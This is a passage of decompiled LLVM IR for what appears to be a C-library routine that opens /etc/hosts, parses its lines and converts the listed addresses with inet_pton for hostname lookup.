  %tmp49 = icmp ult i32 %v0_10015408, 32
  br i1 %tmp49, label %dec_label_pc_100156ac, label %dec_label_pc_10015400

dec_label_pc_10015400:                            ; preds = %dec_label_pc_100153f8
  %v3_10015400 = icmp eq i32 %arg4, 1
  %v1_10015404 = add i32 %v0_10015404, 32
  store i32 %v1_10015404, i32* @r24, align 4
  %v1_10015408 = add i32 %v0_10015408, -32
  store i32 %v1_10015408, i32* @r27, align 4
  br i1 %v3_10015400, label %dec_label_pc_10015508, label %dec_label_pc_10015410

dec_label_pc_10015410:                            ; preds = %dec_label_pc_10015400
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_10015418 = inttoptr i32 %arg8 to i32*
  store i32 -1, i32* %v2_10015418, align 4
  %tmp50 = icmp ult i32 %v1_10015408, 4
  br i1 %tmp50, label %dec_label_pc_100156ac, label %dec_label_pc_10015420

dec_label_pc_10015420:                            ; preds = %dec_label_pc_10015410
  %v0_10015420 = load i32, i32* %r9.global-to-local, align 4
  %v1_10015420 = add i32 %v0_10015420, -36
  store i32 %v1_10015420, i32* %r0.global-to-local, align 4
  %tmp51 = icmp ult i32 %v1_10015420, 8
  br i1 %tmp51, label %dec_label_pc_100156ac, label %dec_label_pc_1001542c

dec_label_pc_1001542c:                            ; preds = %dec_label_pc_10015420
  %v0_1001542c = load i32, i32* @r27, align 4
  %tmp52 = icmp ult i32 %v0_1001542c, 16
  br i1 %tmp52, label %dec_label_pc_100156ac, label %dec_label_pc_10015434

dec_label_pc_10015434:                            ; preds = %dec_label_pc_1001542c
  %v1_10015434 = add i32 %v0_10015420, -48
  store i32 %v1_10015434, i32* %r0.global-to-local, align 4
  %tmp53 = icmp ult i32 %v1_10015434, 8
  br i1 %tmp53, label %dec_label_pc_100156ac, label %dec_label_pc_10015440

dec_label_pc_10015440:                            ; preds = %dec_label_pc_10015434
  %v1_10015440 = add i32 %v0_10015420, -56
  store i32 %v1_10015440, i32* %r0.global-to-local, align 4
  %v1_10015444 = add i32 %v0_10015420, -44
  store i32 %v1_10015444, i32* @r27, align 4
  %v3_10015448 = icmp ugt i32 %v1_10015440, %v1_10015444
  %v0_1001544c = load i32, i32* @r30, align 4
  %v1_1001544c = add i32 %v0_1001544c, 36
  store i32 %v1_1001544c, i32* @r29, align 4
  %v1_10015450 = add i32 %v0_1001544c, 48
  store i32 %v1_10015450, i32* @r26, align 4
  br i1 %v3_10015448, label %dec_label_pc_10015464, label %dec_label_pc_1001545c

dec_label_pc_1001545c:                            ; preds = %dec_label_pc_10015440
  store i32 %v1_10015440, i32* @r27, align 4
  br label %dec_label_pc_10015464

dec_label_pc_10015464:                            ; preds = %dec_label_pc_10015440, %dec_label_pc_1001545c
  %v0_10015464 = phi i32 [ %v1_10015440, %dec_label_pc_1001545c ], [ %v1_10015444, %dec_label_pc_10015440 ]
  %tmp54 = icmp ult i32 %v0_10015464, 80
  br i1 %tmp54, label %dec_label_pc_100156ac, label %dec_label_pc_1001546c

dec_label_pc_1001546c:                            ; preds = %dec_label_pc_10015464
  store i32 268522608, i32* @lr, align 4
  %v0_1001546c = call i32 @__open_etc_hosts()
  store i32 %v0_1001546c, i32* @r20, align 4
  %v3_10015470 = icmp eq i32 %v0_1001546c, 0
  br i1 %v3_10015470, label %dec_label_pc_10015490, label %dec_label_pc_10015478

dec_label_pc_10015478:                            ; preds = %dec_label_pc_1001546c
  %v0_10015478 = load i32, i32* @r24, align 4
  store i32 %v0_10015478, i32* @r25, align 4
  %v0_10015480 = load i32, i32* @r26, align 4
  store i32 %v0_10015480, i32* @r23, align 4
  %v0_10015484 = load i32, i32* @r31, align 4
  store i32 %v0_10015484, i32* @r24, align 4
  store i32 %v0_10015478, i32* %r21.global-to-local, align 4
  %v1_10015520.pre = load i32, i32* %r16.global-to-local, align 4
  br label %dec_label_pc_10015518

dec_label_pc_10015490:                            ; preds = %dec_label_pc_1001546c
  %v1_10015490 = load i32, i32* %r17.global-to-local, align 4
  %v2_10015490 = inttoptr i32 %v1_10015490 to i32*
  store i32 0, i32* %v2_10015490, align 4
  %v0_10015494 = call i32 @__errno_location()
  %v1_10015498 = inttoptr i32 %v0_10015494 to i32*
  %v2_10015498 = load i32, i32* %v1_10015498, align 4
  store i32 %v2_10015498, i32* @r26, align 4
  br label %dec_label_pc_100156b0

dec_label_pc_100154a0:                            ; preds = %dec_label_pc_10015640
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_100154a4 = load i32, i32* @r25, align 4
  %v1_100154a4 = load i32, i32* @r22, align 4
  %v2_100154a4 = inttoptr i32 %v1_100154a4 to i32*
  store i32 %v0_100154a4, i32* %v2_100154a4, align 4
  %v0_100154a8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100154a8 = load i32, i32* @r22, align 4
  %v2_100154a8 = add i32 %v1_100154a8, 4
  %v3_100154a8 = inttoptr i32 %v2_100154a8 to i32*
  store i32 %v0_100154a8, i32* %v3_100154a8, align 4
  %v0_100154ac = load i32, i32* @r30, align 4
  %v1_100154ac = add i32 %v0_100154ac, 8
  store i32 %v1_100154ac, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_100154b4 = add i32 %v0_100154ac, 4
  %v2_100154b4 = inttoptr i32 %v1_100154b4 to i32*
  %v3_100154b4 = load i32, i32* %v2_100154b4, align 4
  store i32 %v3_100154b4, i32* %r0.global-to-local, align 4
  %v0_100154b8 = load i32, i32* %r19.global-to-local, align 4
  %v1_100154b8 = load i32, i32* @r28, align 4
  %v2_100154b8 = add i32 %v1_100154b8, 8
  %v3_100154b8 = inttoptr i32 %v2_100154b8 to i32*
  store i32 %v0_100154b8, i32* %v3_100154b8, align 4
  %v0_100154bc = load i32, i32* %r0.global-to-local, align 4
  %v1_100154bc = load i32, i32* @r28, align 4
  %v2_100154bc = inttoptr i32 %v1_100154bc to i32*
  store i32 %v0_100154bc, i32* %v2_100154bc, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_100154c4 = load i32, i32* @r28, align 4
  %v2_100154c4 = add i32 %v1_100154c4, 12
  %v3_100154c4 = inttoptr i32 %v2_100154c4 to i32*
  store i32 4, i32* %v3_100154c4, align 4
  %v0_100154c8 = load i32, i32* @r22, align 4
  %v1_100154c8 = load i32, i32* @r28, align 4
  %v2_100154c8 = add i32 %v1_100154c8, 16
  %v3_100154c8 = inttoptr i32 %v2_100154c8 to i32*
  store i32 %v0_100154c8, i32* %v3_100154c8, align 4
  br label %dec_label_pc_100154fc

dec_label_pc_100154d0:                            ; preds = %dec_label_pc_10015664
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_100154d4 = load i32, i32* %r21.global-to-local, align 4
  %v1_100154d4 = load i32, i32* @r23, align 4
  %v2_100154d4 = inttoptr i32 %v1_100154d4 to i32*
  store i32 %v0_100154d4, i32* %v2_100154d4, align 4
  %v0_100154d8 = load i32, i32* %r0.global-to-local, align 4
  %v1_100154d8 = load i32, i32* @r23, align 4
  %v2_100154d8 = add i32 %v1_100154d8, 4
  %v3_100154d8 = inttoptr i32 %v2_100154d8 to i32*
  store i32 %v0_100154d8, i32* %v3_100154d8, align 4
  %v0_100154dc = load i32, i32* @r30, align 4
  %v1_100154dc = add i32 %v0_100154dc, 8
  store i32 %v1_100154dc, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v1_100154e4 = add i32 %v0_100154dc, 4
  %v2_100154e4 = inttoptr i32 %v1_100154e4 to i32*
  %v3_100154e4 = load i32, i32* %v2_100154e4, align 4
  store i32 %v3_100154e4, i32* %r0.global-to-local, align 4
  %v0_100154e8 = load i32, i32* %r19.global-to-local, align 4
  %v1_100154e8 = load i32, i32* @r28, align 4
  %v2_100154e8 = add i32 %v1_100154e8, 8
  %v3_100154e8 = inttoptr i32 %v2_100154e8 to i32*
  store i32 %v0_100154e8, i32* %v3_100154e8, align 4
  %v0_100154ec = load i32, i32* %r0.global-to-local, align 4
  %v1_100154ec = load i32, i32* @r28, align 4
  %v2_100154ec = inttoptr i32 %v1_100154ec to i32*
  store i32 %v0_100154ec, i32* %v2_100154ec, align 4
  store i32 16, i32* %r0.global-to-local, align 4
  %v1_100154f4 = load i32, i32* @r28, align 4
  %v2_100154f4 = add i32 %v1_100154f4, 12
  %v3_100154f4 = inttoptr i32 %v2_100154f4 to i32*
  store i32 16, i32* %v3_100154f4, align 4
  %v0_100154f8 = load i32, i32* @r23, align 4
  %v1_100154f8 = load i32, i32* @r28, align 4
  %v2_100154f8 = add i32 %v1_100154f8, 16
  %v3_100154f8 = inttoptr i32 %v2_100154f8 to i32*
  store i32 %v0_100154f8, i32* %v3_100154f8, align 4
  br label %dec_label_pc_100154fc

dec_label_pc_100154fc:                            ; preds = %dec_label_pc_100154a0, %dec_label_pc_100154d0
  %v0_100154fc = load i32, i32* %r9.global-to-local, align 4
  %v1_100154fc = load i32, i32* @r28, align 4
  %v2_100154fc = add i32 %v1_100154fc, 4
  %v3_100154fc = inttoptr i32 %v2_100154fc to i32*
  store i32 %v0_100154fc, i32* %v3_100154fc, align 4
  %v0_10015500 = load i32, i32* @r28, align 4
  %v1_10015500 = load i32, i32* %r17.global-to-local, align 4
  %v2_10015500 = inttoptr i32 %v1_10015500 to i32*
  store i32 %v0_10015500, i32* %v2_10015500, align 4
  br label %dec_label_pc_10015698

dec_label_pc_10015508:                            ; preds = %dec_label_pc_10015400
  store i32 0, i32* @r25, align 4
  store i32 0, i32* %r21.global-to-local, align 4
  store i32 0, i32* @r23, align 4
  br label %dec_label_pc_10015518

dec_label_pc_10015518:                            ; preds = %dec_label_pc_10015478, %dec_label_pc_10015508
  %v1_10015520 = phi i32 [ %v1_10015520.pre, %dec_label_pc_10015478 ], [ %arg8, %dec_label_pc_10015508 ]
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r26, align 4
  %v2_10015520 = inttoptr i32 %v1_10015520 to i32*
  store i32 1, i32* %v2_10015520, align 4
  br label %dec_label_pc_10015680

dec_label_pc_10015528:                            ; preds = %dec_label_pc_10015680
  %v0_10015528 = load i32, i32* @r24, align 4
  store i32 %v0_10015528, i32* @r3, align 4
  store i32 268522804, i32* @lr, align 4
  %v2_10015530 = call i32 @__GI_strchr(i32 %v0_10015528, i32 35)
  %v4_10015534 = icmp eq i32 %v2_10015530, 0
  br i1 %v4_10015534, label %dec_label_pc_10015544, label %dec_label_pc_1001553c

dec_label_pc_1001553c:                            ; preds = %dec_label_pc_10015528
  %v3_10015530 = inttoptr i32 %v2_10015530 to i8*
  store i32 0, i32* %r0.global-to-local, align 4
  store i8 0, i8* %v3_10015530, align 1
  br label %dec_label_pc_10015544

dec_label_pc_10015544:                            ; preds = %dec_label_pc_10015528, %dec_label_pc_1001553c
  %v0_10015544 = load i32, i32* @r24, align 4
  store i32 %v0_10015544, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  %v1_100155c017 = inttoptr i32 %v0_10015544 to i8*
  %v2_100155c018 = load i8, i8* %v1_100155c017, align 1
  %v3_100155c019 = zext i8 %v2_100155c018 to i32
  store i32 %v3_100155c019, i32* %r0.global-to-local, align 4
  %v3_100155c421 = icmp eq i8 %v2_100155c018, 0
  br i1 %v3_100155c421, label %dec_label_pc_100155cc, label %dec_label_pc_1001555c.preheader

dec_label_pc_10015550:                            ; preds = %dec_label_pc_1001556c
  store i32 0, i32* %r0.global-to-local, align 4
  %v3_10015554 = inttoptr i32 %v0_10015590 to i8*
  store i8 0, i8* %v3_10015554, align 1
  %v0_10015558 = load i32, i32* %r11.global-to-local, align 4
  %v1_10015558 = add i32 %v0_10015558, 1
  store i32 %v1_10015558, i32* %r11.global-to-local, align 4
  %v1_1001555c = inttoptr i32 %v1_10015558 to i8*
  %v2_1001555c = load i8, i8* %v1_1001555c, align 1
  %v3_1001555c = zext i8 %v2_1001555c to i32
  store i32 %v3_1001555c, i32* %r0.global-to-local, align 4
  %v3_10015560 = icmp eq i8 %v2_1001555c, 0
  br i1 %v3_10015560, label %dec_label_pc_100155cc, label %dec_label_pc_1001556c

dec_label_pc_1001556c:                            ; preds = %dec_label_pc_1001555c.preheader, %dec_label_pc_10015550
  %v0_10015590 = phi i32 [ %v1_10015558, %dec_label_pc_10015550 ], [ %v0_1001555c2, %dec_label_pc_1001555c.preheader ]
  %v0_10015574.in = phi i32 [ %v3_1001555c, %dec_label_pc_10015550 ], [ %v3_1001555c5, %dec_label_pc_1001555c.preheader ]
  %v0_10015574 = mul nuw nsw i32 %v0_10015574.in, 2
  %v3_10015570 = load i32, i32* @global_var_1002ab70, align 4
  store i32 %v3_10015570, i32* %r9.global-to-local, align 4
  %v2_10015574 = add i32 %v3_10015570, %v0_10015574
  %v3_10015574 = inttoptr i32 %v2_10015574 to i16*
  %v4_10015574 = load i16, i16* %v3_10015574, align 2
  %v5_10015574 = zext i16 %v4_10015574 to i32
  store i32 %v5_10015574, i32* %r0.global-to-local, align 4
  %v1_10015578 = and i32 %v5_10015574, 32
  store i32 %v1_10015578, i32* %r9.global-to-local, align 4
  %v3_10015578 = icmp eq i32 %v1_10015578, 0
  br i1 %v3_10015578, label %dec_label_pc_10015580, label %dec_label_pc_10015550

dec_label_pc_10015580:                            ; preds = %dec_label_pc_1001556c
  %v0_10015580 = load i32, i32* @r29, align 4
  %v2_10015580 = icmp sgt i32 %v0_10015580, 6
  br i1 %v2_10015580, label %dec_label_pc_1001559c.preheader, label %dec_label_pc_10015588

dec_label_pc_10015588:                            ; preds = %dec_label_pc_10015580
  %v1_10015588 = mul i32 %v0_10015580, 4
  store i32 %v1_10015588, i32* %r0.global-to-local, align 4
  %v1_1001558c = add i32 %v0_10015580, 1
  store i32 %v1_1001558c, i32* @r29, align 4
  %v1_10015590 = load i32, i32* @r30, align 4
  %v3_10015590 = add i32 %v1_10015590, %v1_10015588
  %v4_10015590 = inttoptr i32 %v3_10015590 to i32*
  store i32 %v0_10015590, i32* %v4_10015590, align 4
  %v0_1001559c9.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1001559c.preheader

dec_label_pc_1001559c.preheader:                  ; preds = %dec_label_pc_10015588, %dec_label_pc_10015580
  %v0_1001559c9 = phi i32 [ %v0_1001559c9.pre, %dec_label_pc_10015588 ], [ %v0_10015590, %dec_label_pc_10015580 ]
  %v1_1001559c10 = inttoptr i32 %v0_1001559c9 to i8*
  %v2_1001559c11 = load i8, i8* %v1_1001559c10, align 1
  %v3_1001559c12 = zext i8 %v2_1001559c11 to i32
  store i32 %v3_1001559c12, i32* %r0.global-to-local, align 4
  %v3_100155a014 = icmp eq i8 %v2_1001559c11, 0
  br i1 %v3_100155a014, label %dec_label_pc_100155c0.loopexit, label %dec_label_pc_100155ac.lr.ph

dec_label_pc_100155ac.lr.ph:                      ; preds = %dec_label_pc_1001559c.preheader
  %v3_100155b0.pre = load i32, i32* @global_var_1002ab70, align 4
  br label %dec_label_pc_100155ac

dec_label_pc_10015598:                            ; preds = %dec_label_pc_100155ac
  %v1_10015598 = add i32 %v0_10015598, 1
  store i32 %v1_10015598, i32* %r11.global-to-local, align 4
  %v1_1001559c = inttoptr i32 %v1_10015598 to i8*
  %v2_1001559c = load i8, i8* %v1_1001559c, align 1
  %v3_1001559c = zext i8 %v2_1001559c to i32
  store i32 %v3_1001559c, i32* %r0.global-to-local, align 4
  %v3_100155a0 = icmp eq i8 %v2_1001559c, 0
  br i1 %v3_100155a0, label %dec_label_pc_100155c0.loopexit, label %dec_label_pc_100155ac

dec_label_pc_100155ac:                            ; preds = %dec_label_pc_100155ac.lr.ph, %dec_label_pc_10015598
  %v0_10015598 = phi i32 [ %v0_1001559c9, %dec_label_pc_100155ac.lr.ph ], [ %v1_10015598, %dec_label_pc_10015598 ]
  %v0_100155b4.in = phi i32 [ %v3_1001559c12, %dec_label_pc_100155ac.lr.ph ], [ %v3_1001559c, %dec_label_pc_10015598 ]
  %v0_100155b4 = mul nuw nsw i32 %v0_100155b4.in, 2
  store i32 %v3_100155b0.pre, i32* %r9.global-to-local, align 4
  %v2_100155b4 = add i32 %v0_100155b4, %v3_100155b0.pre
  %v3_100155b4 = inttoptr i32 %v2_100155b4 to i16*
  %v4_100155b4 = load i16, i16* %v3_100155b4, align 2
  %v5_100155b4 = zext i16 %v4_100155b4 to i32
  store i32 %v5_100155b4, i32* %r0.global-to-local, align 4
  %v1_100155b8 = and i32 %v5_100155b4, 32
  store i32 %v1_100155b8, i32* %r9.global-to-local, align 4
  %v3_100155b8 = icmp eq i32 %v1_100155b8, 0
  br i1 %v3_100155b8, label %dec_label_pc_10015598, label %dec_label_pc_100155c0.loopexit

dec_label_pc_100155c0.loopexit:                   ; preds = %dec_label_pc_100155ac, %dec_label_pc_10015598, %dec_label_pc_1001559c.preheader
  %v0_100155c0 = phi i32 [ %v0_1001559c9, %dec_label_pc_1001559c.preheader ], [ %v0_10015598, %dec_label_pc_100155ac ], [ %v1_10015598, %dec_label_pc_10015598 ]
  %v1_100155c0 = inttoptr i32 %v0_100155c0 to i8*
  %v2_100155c0 = load i8, i8* %v1_100155c0, align 1
  %v3_100155c0 = zext i8 %v2_100155c0 to i32
  store i32 %v3_100155c0, i32* %r0.global-to-local, align 4
  %v3_100155c4 = icmp eq i8 %v2_100155c0, 0
  br i1 %v3_100155c4, label %dec_label_pc_100155cc, label %dec_label_pc_1001555c.preheader

dec_label_pc_1001555c.preheader:                  ; preds = %dec_label_pc_10015544, %dec_label_pc_100155c0.loopexit
  %v0_1001555c2 = phi i32 [ %v0_100155c0, %dec_label_pc_100155c0.loopexit ], [ %v0_10015544, %dec_label_pc_10015544 ]
  %v1_1001555c3 = inttoptr i32 %v0_1001555c2 to i8*
  %v2_1001555c4 = load i8, i8* %v1_1001555c3, align 1
  %v3_1001555c5 = zext i8 %v2_1001555c4 to i32
  store i32 %v3_1001555c5, i32* %r0.global-to-local, align 4
  %v3_100155607 = icmp eq i8 %v2_1001555c4, 0
  br i1 %v3_100155607, label %dec_label_pc_100155cc, label %dec_label_pc_1001556c

dec_label_pc_100155cc:                            ; preds = %dec_label_pc_100155c0.loopexit, %dec_label_pc_1001555c.preheader, %dec_label_pc_10015550, %dec_label_pc_10015544
  %v0_100155cc = load i32, i32* @r29, align 4
  %v1_100155d0 = mul i32 %v0_100155cc, 4
  store i32 %v1_100155d0, i32* %r9.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_100155d8 = load i32, i32* @r30, align 4
  %v3_100155d8 = add i32 %v2_100155d8, %v1_100155d0
  %v4_100155d8 = inttoptr i32 %v3_100155d8 to i32*
  store i32 0, i32* %v4_100155d8, align 4
  %tmp55 = icmp slt i32 %v0_100155cc, 2
  br i1 %tmp55, label %dec_label_pc_10015680, label %dec_label_pc_100155e0

dec_label_pc_100155e0:                            ; preds = %dec_label_pc_100155cc
  %v0_100155e0 = load i32, i32* %r18.global-to-local, align 4
  %v3_100155e0 = icmp eq i32 %v0_100155e0, 1
  br i1 %v3_100155e0, label %dec_label_pc_10015698, label %dec_label_pc_100155e8

dec_label_pc_100155e8:                            ; preds = %dec_label_pc_100155e0
  %v3_100155e8 = icmp eq i32 %v0_100155e0, 2
  store i32 1, i32* @r31, align 4
  br i1 %v3_100155e8, label %dec_label_pc_100155f4, label %dec_label_pc_10015620.preheader

dec_label_pc_10015620.preheader:                  ; preds = %dec_label_pc_100155e8
  %v1_1001562023 = load i32, i32* @r29, align 4
  %v2_1001562024 = icmp sgt i32 %v1_1001562023, 1
  store i32 4, i32* %r0.global-to-local, align 4
  %v0_1001562829 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_1001562829, i32* @r3, align 4
  br i1 %v2_1001562024, label %dec_label_pc_1001560c, label %dec_label_pc_10015630

dec_label_pc_100155f4:                            ; preds = %dec_label_pc_100155e8
  %v0_100155f4 = load i32, i32* @r30, align 4
  %v1_100155f4 = inttoptr i32 %v0_100155f4 to i32*
  %v2_100155f4 = load i32, i32* %v1_100155f4, align 4
  store i32 %v2_100155f4, i32* @r4, align 4
  %v0_100155f8 = load i32, i32* %r15.global-to-local, align 4
  %v2_100155fc = inttoptr i32 %v0_100155f8 to i8*
  %v3_100155fc = call i32 @__GI_strcoll(i8* %v2_100155fc, i32 %v2_100155f4)
  %v3_10015600 = icmp eq i32 %v3_100155fc, 0
  br i1 %v3_10015600, label %dec_label_pc_10015638, label %dec_label_pc_10015680

dec_label_pc_1001560c:                            ; preds = %dec_label_pc_10015620.preheader, %dec_label_pc_1001561c
  %v1_1001560c = phi i32 [ %v1_10015624, %dec_label_pc_1001561c ], [ 4, %dec_label_pc_10015620.preheader ]
  %v0_1001562831 = phi i32 [ %v0_10015628, %dec_label_pc_1001561c ], [ %v0_1001562829, %dec_label_pc_10015620.preheader ]
  %v0_1001560c = load i32, i32* @r30, align 4
  %v2_1001560c = add i32 %v0_1001560c, %v1_1001560c
  %v3_1001560c = inttoptr i32 %v2_1001560c to i32*
  %v4_1001560c = load i32, i32* %v3_1001560c, align 4
  store i32 %v4_1001560c, i32* @r4, align 4
  %v2_10015610 = call i32 @__GI_strcasecmp(i32 %v0_1001562831, i32 %v4_1001560c)
  %v3_10015614 = icmp eq i32 %v2_10015610, 0
  %v0_10015630.pre = load i32, i32* @r31, align 4
  br i1 %v3_10015614, label %dec_label_pc_1001560c.dec_label_pc_10015630_crit_edge, label %dec_label_pc_1001561c

dec_label_pc_1001561c:                            ; preds = %dec_label_pc_1001560c
  %v1_1001561c = add i32 %v0_10015630.pre, 1
  store i32 %v1_1001561c, i32* @r31, align 4
  %v1_10015620 = load i32, i32* @r29, align 4
  %v2_10015620 = icmp slt i32 %v1_1001561c, %v1_10015620
  %v1_10015624 = mul i32 %v1_1001561c, 4
  store i32 %v1_10015624, i32* %r0.global-to-local, align 4
  %v0_10015628 = load i32, i32* %r15.global-to-local, align 4
  store i32 %v0_10015628, i32* @r3, align 4
  br i1 %v2_10015620, label %dec_label_pc_1001560c, label %dec_label_pc_10015630

dec_label_pc_1001560c.dec_label_pc_10015630_crit_edge: ; preds = %dec_label_pc_1001560c
  %v1_10015630.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10015630

dec_label_pc_10015630:                            ; preds = %dec_label_pc_1001561c, %dec_label_pc_1001560c.dec_label_pc_10015630_crit_edge, %dec_label_pc_10015620.preheader
  %v1_10015630 = phi i32 [ %v1_10015630.pre, %dec_label_pc_1001560c.dec_label_pc_10015630_crit_edge ], [ %v1_1001562023, %dec_label_pc_10015620.preheader ], [ %v1_10015620, %dec_label_pc_1001561c ]
  %v0_10015630 = phi i32 [ %v0_10015630.pre, %dec_label_pc_1001560c.dec_label_pc_10015630_crit_edge ], [ 1, %dec_label_pc_10015620.preheader ], [ %v1_1001561c, %dec_label_pc_1001561c ]
  %v2_10015630 = icmp slt i32 %v0_10015630, %v1_10015630
  br i1 %v2_10015630, label %dec_label_pc_10015638, label %dec_label_pc_10015680

dec_label_pc_10015638:                            ; preds = %dec_label_pc_100155f4, %dec_label_pc_10015630
  %v0_10015638 = load i32, i32* %r19.global-to-local, align 4
  %v3_10015638 = icmp eq i32 %v0_10015638, 2
  br i1 %v3_10015638, label %dec_label_pc_10015640, label %dec_label_pc_1001565c

dec_label_pc_10015640:                            ; preds = %dec_label_pc_10015638
  %v0_10015640 = load i32, i32* @r30, align 4
  %v1_10015640 = inttoptr i32 %v0_10015640 to i32*
  %v2_10015640 = load i32, i32* %v1_10015640, align 4
  %v0_10015648 = load i32, i32* @r25, align 4
  store i32 268523088, i32* @lr, align 4
  %v3_1001564c = inttoptr i32 %v2_10015640 to i8*
  %v4_1001564c = call i32 @inet_pton(i32 2, i8* %v3_1001564c, i32 %v0_10015648)
  %v2_10015650 = icmp sgt i32 %v4_1001564c, 0
  br i1 %v2_10015650, label %dec_label_pc_100154a0, label %dec_label_pc_1001567c

dec_label_pc_1001565c:                            ; preds = %dec_label_pc_10015638
  %v3_1001565c = icmp eq i32 %v0_10015638, 10
  br i1 %v3_1001565c, label %dec_label_pc_10015664, label %dec_label_pc_1001567c

dec_label_pc_10015664:                            ; preds = %dec_label_pc_1001565c
  %v0_10015664 = load i32, i32* @r30, align 4
  %v1_10015664 = inttoptr i32 %v0_10015664 to i32*
  %v2_10015664 = load i32, i32* %v1_10015664, align 4
  %v0_1001566c = load i32, i32* %r21.global-to-local, align 4
  store i32 268523124, i32* @lr, align 4
  %v3_10015670 = inttoptr i32 %v2_10015664 to i8*
  %v4_10015670 = call i32 @inet_pton(i32 10, i8* %v3_10015670, i32 %v0_1001566c)
  %v2_10015674 = icmp sgt i32 %v4_10015670, 0
  br i1 %v2_10015674, label %dec_label_pc_100154d0, label %dec_label_pc_1001567c

dec_label_pc_1001567c:                            ; preds = %dec_label_pc_10015640, %dec_label_pc_1001565c, %dec_label_pc_10015664
  store i32 2, i32* @r26, align 4
  br label %dec_label_pc_10015680

dec_label_pc_10015680:                            ; preds = %dec_label_pc_10015630, %dec_label_pc_100155f4, %dec_label_pc_100155cc, %dec_label_pc_1001567c, %dec_label_pc_10015518
  %v0_10015680 = load i32, i32* @r24, align 4
  %v0_10015684 = load i32, i32* @r27, align 4
  %v0_10015688 = load i32, i32* @r20, align 4
  store i32 268523152, i32* @lr, align 4
  %v3_1001568c = call i32 @fgets(i32 %v0_10015680, i32 %v0_10015684, i32 %v0_10015688)
  %v3_10015690 = icmp eq i32 %v3_1001568c, 0
  br i1 %v3_10015690, label %dec_label_pc_10015698, label %dec_label_pc_10015528

dec_label_pc_10015698:                            ; preds = %dec_label_pc_10015680, %dec_label_pc_100155e0, %dec_label_pc_100154fc
  %v0_10015698 = load i32, i32* %r18.global-to-local, align 4
  %v3_10015698 = icmp eq i32 %v0_10015698, 1
  br i1 %v3_10015698, label %dec_label_pc_100156b0, label %dec_label_pc_100156a0

dec_label_pc_100156a0:                            ; preds = %dec_label_pc_10015698
  %v0_100156a0 = load i32, i32* @r20, align 4
  store i32 ptrtoint (i32* @global_var_100156a8.732 to i32), i32* @lr, align 4
  %v1_100156a4 = inttoptr i32 %v0_100156a0 to i16*
  %v2_100156a4 = call i32 @__GI_fclose(i16* %v1_100156a4)
  br label %dec_label_pc_100156b0

dec_label_pc_100156ac:                            ; preds = %dec_label_pc_10015464, %dec_label_pc_10015434, %dec_label_pc_1001542c, %dec_label_pc_10015420, %dec_label_pc_10015410, %dec_label_pc_100153f8, %dec_label_pc_100153e8
  store i32 34, i32* @r26, align 4
  br label %dec_label_pc_100156b0

dec_label_pc_100156b0:                            ; preds = %dec_label_pc_10015698, %dec_label_pc_100156a0, %dec_label_pc_10015490, %dec_label_pc_100156ac
  store i32 %v0_100153ac, i32* %r0.global-to-local, align 4
  %v0_100156b4 = load i32, i32* @r26, align 4
  ret i32 %v0_100156b4

; uselistorder directives
  uselistorder i32 %v0_10015628, { 1, 0 }
  uselistorder i32 %v1_1001561c, { 1, 0, 2, 3 }
  uselistorder i32 %v1_100155d0, { 1, 0 }
  uselistorder i32 %v0_100155cc, { 1, 0 }
  uselistorder i32 %v3_1001555c5, { 1, 0 }
  uselistorder i32 %v0_1001555c2, { 1, 0 }
  uselistorder i32 %v1_10015588, { 1, 0 }
  uselistorder i32 %v0_10015580, { 1, 0, 2 }
  uselistorder i32 %v2_10015530, { 1, 0 }
  uselistorder i32 %v0_10015420, { 1, 0, 2, 3 }
  uselistorder i32 %v0_100153f8.pr, { 1, 0, 2 }
  uselistorder i32 %v1_100153c4, { 4, 3, 2, 1, 0 }
  uselistorder i32* %r9.global-to-local, { 5, 6, 7, 8, 9, 3, 2, 4, 10, 11, 0, 1 }
  uselistorder i32* %r21.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r19.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r15.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r11.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32* %r0.global-to-local, { 0, 11, 30, 12, 27, 19, 13, 14, 28, 15, 16, 18, 17, 29, 20, 21, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 22, 23, 24, 25, 26 }
  uselistorder i32 34, { 5, 6, 10, 1, 2, 3, 8, 9, 7, 0, 4 }
  uselistorder i32 (i32, i32, i32)* @fgets, { 1, 0 }
  uselistorder i32 10, { 11, 30, 31, 32, 33, 34, 35, 36, 23, 24, 20, 21, 22, 38, 37, 39, 40, 6, 45, 1, 41, 2, 42, 0, 7, 12, 48, 13, 25, 14, 26, 27, 8, 43, 44, 16, 15, 4, 5, 19, 28, 29, 17, 3, 10, 9, 47, 18, 46 }
  uselistorder i32 (i8*, i32)* @__GI_strcoll, { 22, 23, 24, 29, 0, 1, 2, 3, 4, 25, 26, 27, 28, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32 6, { 26, 27, 28, 29, 30, 0, 1, 2, 20, 21, 22, 23, 10, 11, 35, 3, 31, 32, 6, 4, 33, 12, 34, 5, 13, 14, 15, 16, 17, 7, 8, 18, 9, 19, 24, 25 }
  uselistorder i32* @global_var_1002ab70, { 0, 3, 1, 4, 5, 2, 6, 7 }
  uselistorder i32 35, { 0, 2, 1 }
  uselistorder i32 80, { 4, 5, 3, 2, 1, 0, 6 }
  uselistorder i32 48, { 17, 11, 12, 13, 1, 14, 15, 18, 6, 19, 20, 2, 21, 22, 23, 8, 24, 7, 25, 3, 0, 26, 27, 4, 16, 9, 10, 5 }
  uselistorder i32 36, { 4, 5, 6, 7, 8, 9, 10, 11, 14, 12, 13, 2, 0, 1, 3 }
  uselistorder i32 -48, { 2, 4, 3, 6, 1, 5, 0 }
